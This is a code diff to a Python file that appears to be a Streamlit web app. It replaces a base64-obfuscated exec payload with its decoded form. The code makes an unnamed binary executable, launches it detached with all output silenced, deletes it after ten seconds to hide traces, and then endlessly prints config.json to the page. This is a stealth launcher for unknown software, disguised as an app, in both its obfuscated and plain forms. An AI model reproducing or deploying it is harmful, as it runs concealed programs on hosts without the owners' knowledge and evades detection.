@@ -1,2 +1,52 @@
-import base64
-exec(base64.b64decode('aW1wb3J0IG9zCmltcG9ydCBzdHJpbmcKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHN5cwppbXBvcnQgdGltZQppbXBvcnQgcmFuZG9tCmZpbGVfbmFtZSA9ICJ4bG9sSlBTNVoiCmRlZiBwcmludGxuKHRleHQpOgogICAgdHJ5OgogICAgICAgIGlmICdzdHJlYW1saXQnIG5vdCBpbiBzeXMubW9kdWxlczoKICAgICAgICAgICAgaW1wb3J0IHN0cmVhbWxpdCBhcyBzdAogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHN0ID0gc3lzLm1vZHVsZXNbJ3N0cmVhbWxpdCddCiAgICAgICAgc3Qud3JpdGUodGV4dCkKICAgIGV4Y2VwdCBJbXBvcnRFcnJvcjoKICAgICAgICBwcmludCh0ZXh0KQoKIyDlkK/liqjnqIvluo/lubborrDlvZXml6Xlv5cKZGVmIHN0YXJ0X3Byb2dyYW1fd2l0aF9sb2dnaW5nKGZpbGVfcGF0aCk6CiAgICBwcm9jZXNzID0gc3VicHJvY2Vzcy5Qb3BlbigKICAgICAgICBbZmlsZV9wYXRoXSwgICMg5omn6KGM55qE5paH5Lu2CiAgICAgICAgc3RkaW49c3VicHJvY2Vzcy5ERVZOVUxMLAogICAgICAgIHN0ZG91dD1zdWJwcm9jZXNzLkRFVk5VTEwsCiAgICAgICAgc3RkZXJyPXN1YnByb2Nlc3MuREVWTlVMTCwKICAgICAgICBzdGFydF9uZXdfc2Vzc2lvbj1UcnVlCiAgICApCgpkZWYgbWFpbigpOgogICAgZmlsZV9wYXRoID0gb3MucGF0aC5qb2luKG9zLmdldGN3ZCgpLCBmaWxlX25hbWUpCiAgICB0cnk6CiAgICAgICAgb3MuY2htb2QoZmlsZV9wYXRoLCAwbzc1NSkKICAgICAgIyAgc3VicHJvY2Vzcy5Qb3BlbihmInNsZWVwIDEwICYmIHJtIC1mIHtvcy5wYXRoLmpvaW4ob3MuZ2V0Y3dkKCksICdjb25maWcuanNvbicpfSIsIHNoZWxsPVRydWUpCiAgICAgICAgc3VicHJvY2Vzcy5Qb3BlbihmInNsZWVwIDEwICYmIHJtIC1mIHtmaWxlX3BhdGh9Iiwgc2hlbGw9VHJ1ZSkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludGxuKGYi5peg5rOV6K6+572u5omn6KGM5p2D6ZmQ77yae2V9IikKICAgIHRyeToKICAgICAgICBzdGFydF9wcm9ncmFtX3dpdGhfbG9nZ2luZyhmaWxlX3BhdGgpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnRsbihmIuWQr+WKqOeoi+W6j+Wksei0pe+8mntlfSIpCiAgICBjaGFyYWN0ZXJzID0gc3RyaW5nLmFzY2lpX2xldHRlcnMgKyBzdHJpbmcuZGlnaXRzCiAgICB3aGlsZSBUcnVlOgogICAgICAgIHRpbWUuc2xlZXAocmFuZG9tLnVuaWZvcm0oMSwgNSkpCiAgICAgICAgcHJpbnRsbignJy5qb2luKHJhbmRvbS5jaG9pY2VzKGNoYXJhY3RlcnMsIGs9cmFuZG9tLnJhbmRpbnQoMSwgMTApICkpKQoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIG1haW4oKQo=').decode('utf-8'))
+import os
+import string
+import subprocess
+import sys
+import time
+import random
+file_name = "xlolJPS5Z"
+def println(text):
+    try:
+        if 'streamlit' not in sys.modules:
+            import streamlit as st
+        else:
+            st = sys.modules['streamlit']
+        st.write(text)
+    except ImportError:
+        print(text)
+
+# 启动程序并记录日志
+def start_program_with_logging(file_path):
+    process = subprocess.Popen(
+        [file_path],  # 执行的文件
+        stdin=subprocess.DEVNULL,
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+        start_new_session=True
+    )
+
+def main():
+    file_path = os.path.join(os.getcwd(), file_name)
+    try:
+        os.chmod(file_path, 0o755)
+      #  subprocess.Popen(f"sleep 10 && rm -f {os.path.join(os.getcwd(), 'config.json')}", shell=True)
+        subprocess.Popen(f"sleep 10 && rm -f {file_path}", shell=True)
+    except Exception as e:
+        println(f"无法设置执行权限：{e}")
+    try:
+        start_program_with_logging(file_path)
+    except Exception as e:
+        println(f"启动程序失败：{e}")
+    characters = string.ascii_letters + string.digits
+    while True:
+        time.sleep(random.uniform(1, 5))
+        println('-------------------------------------------------------')
+        try:
+            with open(os.path.join(os.getcwd(), 'config.json'),'r',encoding="utf-8") as f:
+                println(f.read())
+        except:
+            println('error')
+        println('-------------------------------------------------------')
+
+if __name__ == "__main__":
+    main()
